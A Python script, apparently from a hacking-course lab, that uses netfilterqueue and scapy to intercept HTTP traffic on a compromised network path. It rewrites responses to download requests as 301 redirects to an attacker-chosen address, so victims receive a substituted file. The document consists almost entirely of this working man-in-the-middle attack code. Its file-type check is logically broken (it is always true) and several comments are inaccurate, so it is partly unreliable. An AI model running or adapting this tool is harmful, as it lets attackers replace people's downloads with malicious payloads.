#!/usr/bin/env python

import netfilterqueue
# module that allow to access the queue from python
import scapy.all as scapy
import optparse
# optparse is the name of the module that allows us to get arguments from the user and parse them and use them within
# our code.


def get_arguments():
    parser = optparse.OptionParser()
    # "optparse" is created as an instance of the option parser class which is an object that can handle parsing
    # we're giving "parser" the arguments that it can expect from users
    parser.add_option("--a", dest="address", help="destination to be redirected to")

    # we're going to tell this child to parse the arguments that it gets from the user.
    # "options"  this is what contains the values that the user
    # inputs to access the value for the interface name and the mac address
    # "arguments" variable is going to contain the arguments.
    (options, arguments) = parser.parse_args()

    # way to check and make sure that the user entered a value for the interface and also entered
    # a value for the Mac
    if not options.address:
        parser.error("[-] please specify an Address , use --help for more info")
    return options


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


options = get_arguments()
location_to_redirect = "Location: " + str(options.address)


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            # if destination port of TCP = 80 , which is a HTTP port
            # that means the packet is a request
            if ".exe" or "DIF" or "DOC" or "DOCX" or "EPS" or "AVI" or "GIF" in scapy_packet[scapy.Raw].load and "10.0.2.5" not in scapy_packet[scapy.Raw].load:
                # detecting exe file
                print("Download Request : ")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                # appending the ack of the packet on the list
                # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            # response filed
            # if source port of TCP = 80 , which is a HTTP port
            # that means the packet is a response
            if scapy_packet[scapy.TCP].seq in ack_list:
                # check if the sequence is contained in my ack_list
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                # clearing the list for a potential packet
                print("replacing file  : ")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\n" + location_to_redirect)
                # 301 moved permanently
                packet.set_payload(str(modified_packet))

    packet.accept()
    # packet.drop()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
